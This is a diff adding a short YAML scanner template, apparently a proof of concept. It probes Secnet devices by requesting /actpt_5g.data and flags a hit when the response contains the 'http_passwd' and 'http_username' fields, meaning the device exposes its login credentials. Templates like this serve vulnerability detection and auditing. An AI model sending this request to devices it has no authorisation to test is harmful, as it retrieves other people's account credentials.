@@ -1,0 +1,14 @@
+name: poc-yaml-Secnet-Information-disclosure
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /actpt_5g.data
+    expression: response.status == 200 && response.body.bcontains(b'http_passwd') && response.body.bcontains(b'http_username')
+expression: r0()
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/138923741
